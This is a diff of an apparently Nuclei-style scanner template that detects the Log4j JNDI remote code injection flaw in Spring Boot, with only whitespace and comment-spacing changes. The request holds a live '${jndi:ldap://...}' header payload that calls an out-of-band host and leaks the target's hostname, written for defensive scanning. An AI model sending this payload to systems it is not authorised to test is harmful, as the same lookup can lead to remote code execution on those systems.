@@ -1,4 +1,5 @@
 id: springboot-log4j-rce
+
 info:
   name: Spring Boot Log4j Remote Code Injection
   author: pdteam
@@ -14,28 +15,33 @@ info:
     cwe-id: CWE-502
   remediation: Upgrade to Log4j 2.3.1 (for Java 6), 2.12.3 (for Java 7), or 2.17.0 (for Java 8 and later).
   tags: springboot,rce,oast,log4j
+
 requests:
   - raw:
       - |
         GET / HTTP/1.1
         Host: {{Hostname}}
         X-Api-Version: ${jndi:ldap://${hostName}.{{interactsh-url}}}
+
     matchers-condition: and
     matchers:
       - type: word
-        part: interactsh_protocol # Confirms the DNS Interaction
+        part: interactsh_protocol  # Confirms the DNS Interaction
         words:
           - "dns"
+
       - type: regex
         part: interactsh_request
         regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Match for extracted ${hostName} variable
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Match for extracted ${hostName} variable
+
     extractors:
       - type: kval
         kval:
           - interactsh_ip # Print remote interaction IP in output
+
       - type: regex
         part: interactsh_request
         group: 1
         regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${hostName} in output
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Print extracted ${hostName} in output
